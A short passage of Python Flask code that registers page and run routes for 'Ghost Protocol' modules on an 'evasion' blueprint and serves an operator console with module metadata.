    evasion_bp.add_url_rule(f"/ghost/{_slug}", f"ghost_page_{_slug}", _make_ghost_page(_slug))
    evasion_bp.add_url_rule(f"/api/ghost/{_slug}/run", f"ghost_run_{_slug}",
                            _make_ghost_run(_slug), methods=["POST"])


def _ghost_module_meta():
    """Serializable metadata for the Ghost Protocol console (no callable refs)."""
    meta = []
    for m in _GHOST_MODULES:
        meta.append({
            "slug": m["slug"],
            "name": m["name"],
            "icon": m["icon"],
            "color": m["color"],
            "subtitle": m["subtitle"],
            "description": m["description"],
            "capabilities": m["capabilities"],
            "inputs": m["inputs"],
            "offline": m["offline"],
        })
    return meta


@evasion_bp.route('/ghost-console')
def ghost_console_page():
    """Ghost Protocol unified operator console."""
    return render_template('ghost_console.html',
                           modules=_ghost_module_meta(),
                           now=datetime.now().strftime('%H:%M:%S'))


